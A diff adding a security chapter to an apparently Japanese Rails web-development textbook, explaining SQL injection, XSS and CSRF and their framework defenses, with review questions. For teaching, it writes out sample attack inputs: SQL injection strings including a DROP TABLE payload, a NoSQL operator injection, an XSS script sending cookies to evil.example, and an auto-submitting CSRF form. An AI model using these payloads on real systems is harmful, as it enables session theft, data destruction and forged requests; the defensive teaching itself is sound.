@@ -2135,7 +2135,64 @@ Response: 304 Not Modified   （本文なし＝転送量ゼロ）</code></pre>
       <section class="chapter" id="ch26">
         <h2>第26章　セキュリティの基礎体力</h2>
         <div class="chap-hole"><span class="label">この章で埋まる穴</span>XSS・CSRF・SQLインジェクションを<strong>仕組みから</strong>。なぜ起きるか、フレームワークがどう防いでいるか、その防御を自分で無効化してしまうアンチパターン。「エスケープ」と「プレースホルダ」の意味を根から理解します。</div>
-        <p class="placeholder">（執筆予定）</p>
+
+        <p>Webの三大脆弱性——XSS・SQLインジェクション・CSRF。個別の対策を暗記することもできるが、それでは応用が利かない。この章はもっと深い一つの原理から出発する。<strong>これらの攻撃はすべて、本来「ただのデータ」であるべきものが「コード（命令）」として解釈されてしまうことで起きる。</strong> ユーザーが入力した名前が、SQLの命令の一部として実行される。掲示板に書いた文字列が、ブラウザでスクリプトとして動く。<strong>データとコードの境界が壊れる</strong>——これが本質だ。この視点を持つと、対策の正体も一つに見えてくる。エスケープもプレースホルダも、やっていることは<strong>「これはデータであってコードではない」と境界を引き直す</strong>ことにほかならない。Railsがこれらをどう自動で防ぎ、そしてどこで<strong>開発者自身がその防御を無効化してしまうか</strong>を、仕組みから見る。攻撃の理屈を理解するのは、悪用のためではなく、防御を「なぜそうするか」で選べるようになるためだ。</p>
+
+        <h3>SQLインジェクション — 文字列連結が命令の壁を壊す</h3>
+        <p>最も古典的で、原理が一番はっきりしている。<a href="#ch16">第16章</a>で書いたSQLを、ユーザー入力から組み立てる場面を考える。Zephyrのイベント検索だ。</p>
+        <pre><code class="lang-ruby"># 危険：ユーザー入力を文字列連結でSQLに埋め込む
+name = params[:q]
+Event.where("title = '#{name}'")   # ← 絶対にやってはいけない</code></pre>
+        <p><code>name</code>が<code>Rails</code>なら<code>title = 'Rails'</code>で問題ない。だが攻撃者が<code>' OR '1'='1</code>を入れると、出来上がるSQLはこうなる。</p>
+        <pre><code class="lang-sql">SELECT * FROM events WHERE title = '' OR '1'='1'</code></pre>
+        <p><code>'1'='1'</code>は常に真だから、<strong>全イベントが返る</strong>。攻撃者が入力した文字列の中の<code>'</code>が、データを囲う引用符を<strong>閉じてしまい</strong>、その後の<code>OR ...</code>が<strong>SQLの命令として解釈された</strong>。これが「データがコードになった」瞬間だ。さらに<code>'; DROP TABLE events; --</code>のような入力なら破壊的な命令すら注入されうる。原因はただ一つ、<strong>DBに渡す文字列の中で「ここまでがデータ、ここからが命令」の境界が、ユーザー入力によって動かせてしまった</strong>ことだ。</p>
+        <p>解決策が<strong>プレースホルダ（バインドパラメータ）</strong>だ。仕組みを正しく理解してほしい。プレースホルダは「引用符をうまく付け直す」ことではない。</p>
+        <pre><code class="lang-ruby"># 安全：値は「?」の位置に、SQL本体とは別の経路で渡す
+Event.where("title = ?", params[:q])
+# ActiveRecord のハッシュ条件も内部でプレースホルダを使う
+Event.where(title: params[:q])</code></pre>
+        <p>プレースホルダでは、<strong>SQLの構文（命令の骨格）と、そこに入る値を、DBに<em>別々に</em>渡す</strong>。DBはまず<code>title = ?</code>という<strong>命令の構造だけを先に解釈・確定</strong>し、そのあとで<code>?</code>の位置に値を「純粋なデータ」として当てはめる。<strong>値は構造が固まった後に入るので、値の中に何が書いてあろうと二度と命令として解釈されない。</strong> <code>' OR '1'='1</code>という入力すら「そういう文字列のタイトルを探す」だけになる。エスケープ（引用符を<code>\'</code>に置換して無害化する後追いの対処）よりプレースホルダが本質的に優れているのは、<strong>そもそもデータとコードを最初から別チャンネルで運び、混ざる余地をなくす</strong>からだ。</p>
+        <aside class="mongo-note"><span class="tag">MongoDB脳の翻訳</span>
+        「MongoはSQLを使わないからインジェクションと無縁」は誤解だ。クエリを<strong>ユーザー入力から動的に組み立てる</strong>限り、同じ病は起きる。MongoDBでは、JSON由来の入力をそのままクエリ条件に流し込むと、<code>{"$gt": ""}</code>のような<strong>演算子オブジェクト</strong>を注入され、認証回避などに使われる（NoSQLインジェクション）。本質はSQLと同一——<strong>ユーザー入力を「データ」として扱うべき所で「クエリ構造の一部」として解釈させてしまう</strong>こと。だから防御も同じ発想だ。入力は必ず値として型を固定して扱い（文字列は文字列として渡す）、入力がクエリの構造を書き換えられないようにする。「どのDBを使うか」ではなく「データとコードの境界を守っているか」が問われる。</aside>
+
+        <h3>XSS — 出力先の文脈で「データがコードになる」</h3>
+        <p>次はXSS（クロスサイト・スクリプティング）。SQLインジェクションが「DBへの<strong>入力</strong>」で境界が壊れたのに対し、XSSは「ブラウザへの<strong>出力</strong>」で壊れる。<a href="#ch11">第11章</a>で見たように、ブラウザはHTMLを受け取ると<code>&lt;script&gt;</code>タグの中身をJavaScriptとして実行する。ここにユーザー入力を無防備に混ぜるとどうなるか。Zephyrのイベントレビュー本文に、攻撃者がこう書く。</p>
+        <pre><code class="lang-js">&lt;script&gt;fetch('https://evil.example/steal?c=' + document.cookie)&lt;/script&gt;</code></pre>
+        <p>このレビューを<strong>そのままHTMLに埋め込んで</strong>他のユーザーに表示すると、被害者のブラウザはこれを<strong>ページの一部のスクリプトとして実行</strong>し、Cookie（<a href="#ch23">第23章</a>のセッションID）を攻撃者に送信する。<a href="#ch23">第23章</a>で<code>HttpOnly</code>属性を「XSSでセッションを盗まれない防御」と説明したのは、まさにこのためだ。ここでも起きているのは同じこと——<strong>攻撃者が入力した「データ」であるはずのレビュー本文が、ブラウザで「コード」として解釈された</strong>。</p>
+        <p>防御は<strong>HTMLエスケープ</strong>。出力時に<code>&lt;</code>を<code>&amp;lt;</code>に、<code>&gt;</code>を<code>&amp;gt;</code>に変換する。こうするとブラウザは<code>&amp;lt;script&amp;gt;</code>を「<code>&lt;script&gt;</code>という<strong>文字列</strong>」として画面に表示するだけで、タグとしては解釈しない。<strong>「これはコードではなく、表示すべきデータだ」とブラウザに伝えるのがエスケープの意味だ。</strong> Railsが強い理由はここにある——ERBの<code>&lt;%= ... %&gt;</code>は<strong>既定で全出力を自動エスケープする</strong>。だから普通に書いている限り、開発者は意識せずともXSSから守られている。</p>
+        <p>問題は、この自動防御を<strong>開発者が自分で無効化してしまう</strong>ときだ。「HTMLタグをそのまま出したい」という理由で<code>html_safe</code>や<code>raw</code>を使う——これは<strong>「この文字列はエスケープするな＝コードとして通してよい」とRailsに宣言する</strong>スイッチだ。ユーザー入力にこれを使った瞬間、自動防御は消し飛ぶ。</p>
+        <pre><code class="lang-ruby"># 危険：ユーザー入力にhtml_safe/rawを使うと自動エスケープが無効になる
+&lt;%= raw @review.body %&gt;              # XSSの穴が開く
+&lt;%= @review.body.html_safe %&gt;        # 同じく危険
+
+# 安全：既定のまま。自動でエスケープされる
+&lt;%= @review.body %&gt;</code></pre>
+        <p>重要なのは、<strong>エスケープは「出力先の文脈」ごとに正しい方法が違う</strong>ことだ。HTMLの本文に出すのと、HTML属性値、<code>&lt;script&gt;</code>内のJS文字列、URLの一部に出すのとでは、「何が危険な文字か」が変わる。だから安全側の原則は<strong>「出力する瞬間に、その文脈に合ったエスケープをかける」</strong>。入力時に一律サニタイズするより、出力時に文脈依存でエスケープする方が堅い——なぜなら同じデータが複数の文脈に出力されうるからだ。ユーザーが本当にリッチテキストを入れられる必要がある場合だけ、<code>sanitize</code>で<strong>許可したタグ以外を除去する</strong>ホワイトリスト方式を使う。<strong>「危険なものを消す（ブラックリスト）」ではなく「安全なものだけ通す（ホワイトリスト）」</strong>——これはセキュリティ全般で繰り返し現れる、より堅い設計原則だ。</p>
+        <aside class="eng-note"><span class="tag">補足</span>
+        近年はもう一枚の防御として<strong>CSP（Content-Security-Policy）</strong>がある。「このページで実行してよいスクリプトの出所」をヘッダで宣言し、インラインの<code>&lt;script&gt;</code>や外部の未許可スクリプトを<strong>ブラウザ自身に拒否させる</strong>。エスケープが一箇所漏れても、CSPがあれば注入スクリプトの実行を止められる。<strong>多層防御</strong>——一つの防御の綻びを別の層が拾う——の考え方は<a href="#ch24">第24章</a>の認可でも見た通りで、セキュリティは単一の完璧な壁ではなく、重ねた網で守る。</aside>
+
+        <h3>CSRF — 「誰か」は正しいのに「意図」が偽られる</h3>
+        <p>三つ目のCSRF（クロスサイト・リクエスト・フォージェリ）は毛色が違う。データがコードになる話ではなく、<a href="#ch23">第23章</a>のCookieの「毎回自動で送られる」性質を逆手に取る攻撃だ。仕組みを追う。田中さんがZephyrにログイン済み（セッションCookieを持つ）とする。攻撃者は罠サイトに、こんな仕掛けを置く。</p>
+        <pre><code class="lang-js">&lt;!-- 攻撃者のサイトに置かれた、自動送信される隠しフォーム --&gt;
+&lt;form action="https://zephyr.example/events/42" method="post"&gt;
+  &lt;input type="hidden" name="_method" value="delete"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+        <p>田中さんがこの罠ページを開いた瞬間、フォームがZephyrへPOSTを送る。ここで<a href="#ch23">第23章</a>の性質が牙を剥く——<strong>ブラウザはZephyr宛のリクエストに、田中さんのセッションCookieを自動で付けてしまう</strong>。だからZephyrサーバから見ると、これは<strong>正しくログインした田中さん本人からの、正規のイベント削除リクエストに見える</strong>。認証（<a href="#ch23">第23章</a>）は完璧に通っている。認可（<a href="#ch24">第24章</a>）すら、田中さんが主催者なら通る。<strong>「誰か」も「してよいか」も正しいのに、田中さんにその<em>意図</em>がなかった</strong>——これがCSRFの本質だ。破れているのは身元でも権限でもなく、<strong>「このリクエストは本当にユーザーが意図して、我々のサイト上から送ったものか」</strong>という前提だ。</p>
+        <p>防御が<strong>CSRFトークン</strong>だ。理屈はこうだ。Zephyrは自分のページにフォームを描くとき、<strong>推測不能な秘密のトークン</strong>を埋め込み、同じ値をセッションにも持つ。フォーム送信時にこのトークンを照合し、一致しなければ拒否する。攻撃者の罠サイトは<strong>このトークンの値を知りようがない</strong>（別ドメインからZephyrのページ内容は読めない）から、正しいトークンを付けられず、偽造リクエストは弾かれる。<strong>「正規のフォームは、我々が発行した秘密を知っている。攻撃者のフォームは知らない」——この非対称性で意図を検証する。</strong> Railsは<code>protect_from_forgery</code>（現在は既定でオン）と、フォームヘルパーが自動で埋める<code>authenticity_token</code>でこれを標準装備している。<code>form_with</code>を使う限り開発者は意識しなくてよい。</p>
+        <p>もう一つの防御が<a href="#ch23">第23章</a>で触れた<strong><code>SameSite</code>Cookie属性</strong>だ。<code>SameSite=Lax</code>にすると、<strong>他サイト由来のリクエストにはCookieを付けない</strong>ようブラウザに指示できる。CSRFの前提（Cookieが自動で付く）を根元から断つ、いわば追加の網だ。ここでもトークンとSameSiteという多層で守る。</p>
+        <aside class="eng-note"><span class="tag">補足</span>
+        なぜCSRF対策は主にPOST/PUT/DELETEに要り、GETには要らないのか。<a href="#ch9">第9章</a>で押さえた<strong>安全性（safe）</strong>が効いてくる。GETは「状態を変えない」約束（安全なメソッド）だから、偽造GETを送られても本来は何も起きない。逆に言えば<strong>GETで状態を変える設計（<code>GET /events/42/delete</code>のようなもの）はCSRF対策の前提を壊す</strong>。<a href="#ch9">第9章</a>のHTTPメソッドの意味論を守ることが、そのままセキュリティの土台になる——設計原則と安全性は地続きだ。</aside>
+
+        <h3>通底する原則と、次へ</h3>
+        <p>三つの脆弱性を貫く原理をもう一度束ねる。SQLインジェクションとXSSは<strong>「データとコードの境界の崩壊」</strong>——プレースホルダとエスケープは、その境界を「これはデータだ」と引き直す道具だった。CSRFは<strong>「意図の偽造」</strong>——トークンは「正規サイトだけが知る秘密」で意図を検証する道具だった。そして全体を通じて、<strong>ホワイトリスト（安全なものだけ通す）</strong>と<strong>多層防御（一枚破れても次で拾う）</strong>という設計態度が繰り返し現れた。Railsが多くを自動で防いでくれる以上、実務で最も危ないのは<strong>その自動防御を<code>raw</code>や文字列連結で自ら無効化する瞬間</strong>だ。「フレームワークが何を守ってくれているか」を知る本当の目的は、<strong>それを不用意に外さないため</strong>である。</p>
+        <p>これで第4部を終える。ステートレスなHTTP（<a href="#ch9">第9章</a>）の上に、セッションと認証で「誰か」を、認可で「何をしてよいか」を、キャッシュで「速さと鮮度」を、そしてセキュリティで「境界と意図」を積み上げてきた——<strong>状態と信頼の設計</strong>だ。だが、ここまでは「一つのリクエストが正しく処理される」世界の話だった。現実のネットワークはもっと不確かだ。<strong>リクエストは二重に届き、レスポンスは返る途中で消え、プロセスは処理の途中で落ちる。</strong> <a href="#ch23">第23章</a>のログインも<a href="#ch24">第24章</a>のイベント編集も、「一回だけ確実に届く」保証などどこにもない。次の第5部「壊れることを前提に」は、そこから始まる。<a href="#ch27">第27章</a>の<strong>冪等性</strong>——同じ操作が二度届いても壊れないようにする設計——を入口に、キュー（<a href="#ch28">第28章</a>）と観測可能性（<a href="#ch29">第29章</a>）へ。信頼できるシステムとは、壊れないシステムではなく、<strong>壊れることを前提に設計されたシステム</strong>だ。</p>
+
+        <div class="check-wrap"><h3>理解度チェック</h3>
+          <details class="check"><summary>Q1. SQLインジェクションはなぜ起きるのか。プレースホルダがエスケープより本質的に安全なのはなぜか？</summary><p>ユーザー入力を文字列連結でSQLに埋め込むと、入力中の<code>'</code>がデータを囲う引用符を閉じ、続く<code>OR ...</code>等がSQLの命令として解釈される＝「データがコードになる」ことで起きる（例：<code>' OR '1'='1</code>で全件取得）。プレースホルダ（<code>where("title = ?", q)</code>）は、SQLの命令構造と値を別チャンネルでDBに渡す。DBは先に命令の骨格だけを解釈・確定し、その後<code>?</code>に値を純粋なデータとして当てはめるので、値に何が書かれていても二度と命令として解釈されない。エスケープ（引用符を後から無害化する後追いの対処）と違い、そもそもデータとコードを最初から分離し混ざる余地をなくす点で本質的に安全。</p></details>
+          <details class="check"><summary>Q2. RailsのERBは既定でXSSを防ぐのに、なぜ現場でXSSが起きるのか。正しい防御の原則は？</summary><p>ERBの<code>&lt;%= %&gt;</code>は既定で全出力をHTMLエスケープ（<code>&lt;</code>→<code>&amp;lt;</code>）し、ブラウザに「これはコードでなく表示すべきデータだ」と伝えるため、普通に書けば守られる。現場でXSSが起きるのは、開発者が<code>raw</code>や<code>html_safe</code>でこの自動エスケープを自ら無効化し、そこにユーザー入力を通すから（<code>&lt;script&gt;...&lt;/script&gt;</code>がコードとして実行されCookie＝セッションIDが盗まれる。第23章の<code>HttpOnly</code>はこの緩和）。原則は「出力する瞬間に、その文脈（HTML本文/属性/JS/URL）に合ったエスケープをかける」こと、リッチテキストが必要な時だけ<code>sanitize</code>で許可タグ以外を除去するホワイトリスト方式を使うこと。加えてCSPで多層防御する。</p></details>
+          <details class="check"><summary>Q3. CSRFは認証・認可が正しくても成立するのはなぜか。CSRFトークンは何を検証しているか？</summary><p>ブラウザは対象サイト宛のリクエストにそのサイトのCookieを自動で付ける（第23章）。攻撃者の罠ページからログイン済みユーザーのブラウザに正規サイト宛のリクエストを送らせると、セッションCookieが自動で付き、サーバからは本人の正規リクエストに見える。よって認証（誰か）も、本人が権限を持てば認可（してよいか）も通ってしまう。破れているのは身元でも権限でもなく「このリクエストを本当にユーザーが意図して自サイト上から送ったか」という前提。CSRFトークンは、正規のフォームにだけ埋め込まれセッションにも保持される推測不能な秘密で、送信時に照合する。別ドメインの攻撃者はこの値を読めず正しく付けられないので弾かれる＝「正規サイトだけが知る秘密」の非対称性で意図の真正性を検証している。<code>SameSite</code>Cookieが追加の網になる。</p></details>
+        </div>
       </section>
 
 <!-- ================= 第5部 ================= -->
